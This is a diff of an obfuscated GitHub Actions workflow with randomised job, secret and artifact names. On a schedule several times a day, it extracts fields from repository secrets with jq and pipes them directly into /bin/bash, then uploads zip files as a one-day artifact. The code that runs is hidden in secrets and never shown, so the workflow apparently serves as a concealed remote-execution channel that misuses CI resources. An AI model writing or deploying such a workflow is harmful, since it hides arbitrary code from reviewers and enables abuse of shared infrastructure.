@@ -1,24 +1,24 @@
 name: mingzhangleiyi
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '38 3/6 * * *'
-jobs:  # 778
+    - cron: '22 2,8,14,20 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: mingzhangleiyi
         env:
-          rask30514: ${{ secrets.rask30514 }}
+          r63: ${{ secrets.r63 }}
         run: |
-          echo $rask30514 | jq -r .jxxga86291 | /bin/bash
-          echo $t58 | jq -r .xyxr81 | /bin/bash
-          echo $slqrh896 | jq -r .at95598 | /bin/bash
-          echo $sfyor84 | jq -r .wqets75168 | /bin/bash
-          echo $lray8 | jq -r .znp309 | /bin/bash
-          echo $wrtb3 | jq -r .ltauk1 | /bin/bash
-          echo $flj9 | jq -r .brlc46039 | /bin/bash
-          echo $iung31565 | jq -r .ke643 | /bin/bash
+          printf '%s' "$r63" | jq -r .kpa13 | /bin/bash
+          printf '%s' "$qaav1" | jq -r .np340 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: dJotqGFQ
+          path: "*.zip"
+          retention-days: 1
